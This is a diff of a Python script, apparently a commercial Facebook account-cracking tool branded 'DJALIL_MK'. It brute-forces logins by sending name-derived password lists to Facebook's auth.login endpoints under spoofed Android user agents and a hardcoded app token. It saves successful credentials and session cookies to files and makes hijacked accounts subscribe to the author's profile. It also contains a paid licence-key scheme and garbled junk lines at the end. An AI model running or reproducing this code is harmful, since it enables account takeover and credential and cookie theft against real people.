Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH1607;FBSV/8.9.2;FBCA/arm64-v8a:;FBDM/{density=2.8,width=868,height=1190};FB_FW/1;FBRV/120078453;]"+"[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649449;FBDM/{density=2.2,width=545,height=753};FBLC/en_US;FBRV/156872539;FB_FW/2;FBCR/Visible;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y30e;FBSV/9.8.0;FBOP/20;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;[FBAN/FB4A;FBAV/356.0.0.28.112;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/311215741;FBCR/SaskTel;FBMF/OPPO;FBBD/oppo;FBDV/CPH1845;FBSV/12.8.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.875,width=1253,height=1834};]"+"[FBAN/FB4A;FBAV/407.0.0.30.97;FBBV/440412261;[FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/440412261;FBCR/TPG Telecom;FBMF/Vivo;FBBD/vivo;FBDV/V5;FBSV/12.6.1;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.8,width=709,height=1043};FB_FW/1;]"
+                           
+                                device_id = str(uuid.uuid4())
+                                adid = str(uuid.uuid4())
+                                li = ['28']
+                                li2 = random.choice(li)
+                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+                                head = {
+                                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent': ua,
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                                url = 'https://b-api.facebook.com/method/auth.login'
+                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+                                q = json.loads(po)
+                                if 'session_key' in q:
+                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        token = q['access_token']
+                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
+                                        open('/sdcard/DJALIL_MK_m3_OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f"\n\033[1;31m⤷⤷ VENOM-CP")
-                                                print(f"\033[1;31m⤷ EMAIL: {ids}")
-                                                print(f"\033[1;31m⤷ PASS: {pas}\033[0m")
-                                                open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -1183,65 +738,259 @@ def M_file_4(ids,names,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass
+                        
+#------------------[  METODE 4  ]-------------------#              
+def M_file_44(ids,names,passlist):
+        try:
+                global ok,loop,sim_id
+                boos = random.choice([P, M, H, K, B, U, O, N])
+                sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua = ua1()
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        headers = {
+                                'User-Agent': ua,
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Host': 'graph.facebook.com',
+                                'X-FB-Net-HNI': '25227',
+                                'X-FB-SIM-HNI': '29752',
+                                'X-FB-Connection-Type': 'MOBILE.LTE',
+                                'X-Tigon-Is-Retry': 'False',
+                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                                'x-fb-device-group': '5120',
+                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                                'X-FB-Request-Analytics-Tags': 'graphservice',
+                                'X-FB-HTTP-Engine': 'Liger',
+                                'X-FB-Client-IP': 'True',
+                                'X-FB-Server-Cluster': 'True',
+                                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                                'Content-Length': '674'
+                        }
+                        #
+                        data = {
+                            'adid': str(uuid.uuid4()),
+                            'format': 'json',
+                            'device_id': str(uuid.uuid4()),
+                            'cpl': 'true',
+                            'family_device_id': str(uuid.uuid4()),
+                            'credentials_type': 'device_based_login_password',
+                            'error_detail_type': 'button_with_disabled',
+                            'source': 'device_based_login',
+                            'email': ids,
+                            'password': pas,
+                            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                            'generate_session_cookies': '1',
+                            'meta_inf_fbmeta': '',
+                            'advertiser_id': str(uuid.uuid4()),
+                            'currently_logged_in_userid': '0',
+                            'locale': "en_US",
+                            'client_country_code': "US",
+                            'method': 'auth.login',
+                            'fb_api_req_friendly_name': 'authenticate',
+                            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                            'api_key': '882a8490361da98702bf97a021ddc14d'
+                        }
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        coki="sb=shawXD01;"+coki
+                                        open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
+                                        open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                #print('\r\r\033[1;34m<[DJALIL_MK-2F]> '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/DJALIL_MK-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:time.sleep(10)
 
-def abhijhirwal():
-    devices = [
-        "Samsung Galaxy S24 Ultra",
-        "iPhone 15 Pro Max",
-        "Google Pixel 8 Pro",
-        "OnePlus 12",
-        "Xiaomi 14 Ultra",
-        "Asus ROG Phone 8",
-        "Huawei Mate 60 Pro",
-        "Sony Xperia 1 V",
-        "Honor Magic6 Pro",
-        "Realme GT5 Pro",
-        "Vivo X100 Pro",
-        "Oppo Find X7 Ultra",
-        "Nothing Phone 2a",
-        "ZTE Nubia Z60 Ultra",
-        "Motorola Edge 50 Pro",
-        "Infinix Zero 30 5G",
-        "RedMagic 9 Pro"
-    ]
-
-    densities = ["density=2.5", "density=2.75", "density=3.0", "density=3.5"]
-    dimensions = [
-        "width=1080,height=2340",
-        "width=1170,height=2532",
-        "width=1440,height=3120",
-        "width=1260,height=2800"
-    ]
+#------------------[  METODE 4  ]-------------------#              
+def M_file_4(ids, names, passlist):
+	try:
+		global ok, loop,  sim_id
+		boos = random.choice([P, M, H, K, B, U, O, N])
+		sys.stdout.write(f'\r\r\033[1;37m<[{boos}DJALIL_MK\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
+        
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+			
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			adid = str(uuid.uuid4())
+			fbav = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
+			fbbv = str(random.randint(111111111,999999999))
+			fbrv = str(random.randint(111111111,999999999))
+			model = device['model']
+			build = device['build']
+			fbmf = device['fbmf']
+			fbbd = device['fbbd']
+			fbdv = device['fbdv']
+			fbsv = device['fbsv']
+			#fbca = device['fbca']
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			ua ="[Dalvik/2.1.0 (Linux; U; Android 14.5.0; CPH2207 Build/OPR6.101106.028) [FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[Dalvik/2.1.0 (Linux; U; Android 12.6.2; SM-J105F Build/PD2A.180728.025) [FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[Dalvik/2.1.0 (Linux; U; Android 5.5.2; V17 Pro Build/PPR1.200306.029) [FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[Dalvik/2.1.0 (Linux; U; Android 9.7.0; Y69 Build/PPR2.180202.010) [FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[Dalvik/2.1.0 (Linux; U; Android 15.6.1; SM-J200F Build/QD4A.130310.058) [FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"
+			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(20000, 40000)),'X-FB-SIM-HNI':str(random.randint(20000, 40000)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			url = 'https://b-graph.facebook.com/auth/login'
+			po = requests.post(url,params=data,headers=head,allow_redirects=False).json()
+			if 'session_key' in po:
+				print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+				open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
+				session = po['session_cookies']
+				cookie = ''
+				cuser = session[0]
+				cuser = session[0]['name']+'='+session[0]['value']
+				cookie+=cuser+';'
+				xs = session[1]['name']+'='+session[1]['value']
+				cookie+=xs+';'
+				fr = session[2]['name']+'='+session[2]['value']
+				cookie+=fr+';'
+				datr = session[3]['name']+'='+session[3]['value']
+				cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
+				pagevoice = cuser.replace('c_user','m_page_voice')
+				cookie+=pagevoice
+				print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
+				open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
+				#token = po['access_token']
+				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
+				oks.append(ids)
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				    if 'y' in pcp:
+					        print('\r\x1b[38;5;246m<[DJALIL_MK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+					        open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					        cps.append(ids)
+					        break
+				            
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		#print(e)
+		pass
+#------------------[  approval  ]-------------------#        
+def newkey():
+    ff = requests.get(link)
+    u = str(os.getuid())  # الحصول على UID النظام
+    pl = str(platform.platform())  # معلومات النظام
+    pl = pl.replace('.', '').replace("-", "")[::-1].upper()  # تعديل وتحويل إلى أحرف كبيرة مقلوبة
+    kk = u + pl[6:6] + platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + u
     
-    locales = ["en_US", "ar_AR", "fr_FR", "es_ES", "de_DE", "pt_BR"]
-    versions = ["13.0.0", "14.0.0", "15.0.0", "16.0.0"]
+    # لا يوجد تشفير Base85 هنا
+    key = kk  # المفتاح يتم تحديده بدون تشفير
+    
+    # التحقق من البيانات المرسلة
+    if "XXFXXFXX" in ff.text:
+        if kk in ff.text:
+            if key in ff.text:
+                return 'Trial', '\033[1;91mPaid\033[1;97m'
+        else:
+            return "Trial", "\033[1;92mFree\033[1;97m"
+    
+    if ff.text == 'null':
+        return 'Napv' + kk
+    if kk in ff.text:
+        if key in ff.text:
+            return 'Apv'
+        else:
+            return 'Fuck'
+    else:
+        return 'Napv' + kk 
+    
+def approval():
+  clear()
+  try:
+    sec = newkey()
+    if sec=='Fuck':Fuck()
+    if 'Trial' in sec:
+        Trial(sec[1])
+    if 'Napv' in sec:
+      boos = random.choice([P, M, H, K, B, U, O, N])
+      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}DJALIL_MK+\033[1;32m"+sec.replace('Napv',''))
+      print('\033[1;34m─────────────────────────────────────────────')
+      print(' \033[1;32m[\033[1;31m–\033[1;32m] You are not premuim user first buy premuim 'ط
+      print('\033[1;34m-─────────────────────────────────────────────')
+      print(f"\033[1;32m[\033[1;31m–\033[1;32m] {boos} Binance \033[1;33m >> \033[1;31m ID : 782102873 ")
+      print('\033[1;34m-─────────────────────────────────────────────')
+      print("\033[1;32m[\033[1;31m–\033[1;32m] 15$ Approval For 1 month  ")
+      print("\033[1;32m[\033[1;31m–\033[1;32m] 10$ Approval For 15 days  ")
+      print("\033[1;32m[\033[1;31m–\033[1;32m] 5$ Approval For 7 days  ")        
+      print('\033[1;34m─────────────────────────────────────────────')     
+      print(" \033[1;32m[\033[1;31m–\033[1;32m] Note : \033[1;32mPAY AND TRY")
+      print('\033[1;34m─────────────────────────────────────────────')
+      input(' \033[1;32m[\033[1;31m–\033[1;32m] Press Enter To Go To WhatsApp')
+      os.system('am start https://wa.me/+213655643510')
+      approval()
+    if sec=='Apv':menu()
+    else:exit()
+  except KeyboardInterrupt:exit()
+  except Exception as e:e=base64.b16encode(str(e).encode('ascii'));print('Something went wrong error code : '+e.decode('ascii'));exit() 
 
-    device = random.choice(devices)
-    brand = device.split()[0]
-    model = device
-    density = random.choice(densities)
-    dimension = random.choice(dimensions)
-    locale = random.choice(locales)
-    version = random.choice(versions)
-    fbav = f"{random.randint(400,499)}.0.0.{random.randint(10,99)}.{random.randint(100,999)}"
-    fbbv = str(random.randint(200000000, 400000000))
-    fbrv = str(random.randint(100000000, 300000000))
-
-    width = dimension.split(',')[0].split('=')[1]
-    height = dimension.split(',')[1].split('=')[1]
-
-    user_agent = (
-        f"FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
-        f"FBDM{{{density},width={width},height={height}}};"
-        f"FBLC/{locale};FBRV/{fbrv};FBCR/alfa;"
-        f"FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;"
-        f"FBDV/{model};FBSV/{version};FBOP/19;FBCA/armeabi-v7a:armeabi;"
-    )
-
-    return user_agent
-try:
-        menu()
-except requests.exceptions.ConnectionError:
-        print('\n No internet connection ...')
-        exit()
-except Exception as e:pass
+#------------------[  END  ]-------------------#
+menu()
+exit()
+while True: requests
+raise KeyError ("XD")
+"HaN".FuCk
+raise SystemExit
+open('').close()
